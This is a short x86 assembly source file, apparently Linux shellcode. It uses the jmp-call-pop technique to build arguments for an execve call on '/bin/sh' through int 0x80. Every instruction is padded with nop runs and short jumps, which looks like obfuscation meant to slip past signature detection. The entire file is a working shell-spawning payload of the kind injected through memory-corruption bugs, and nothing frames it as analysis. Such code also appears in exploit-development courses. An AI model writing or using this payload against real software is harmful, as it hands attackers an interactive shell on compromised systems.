
global _start
_start:
		jmp call_shellcode

shellcode:
		pop esi

		xor ebx, ebx
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		mov byte [esi +7], bl
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		mov dword [esi +8], esi
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		mov dword [esi +12], ebx
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		lea ebx, [esi]
		nop
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		lea ecx, [esi +8]
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		lea edx, [esi +12]
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		xor eax, eax
		mov al, 11	
		int 0x80
		nop
		nop
		
call_shellcode:
		call shellcode
		Shellcode db "/bin/shABBBBCCCC"
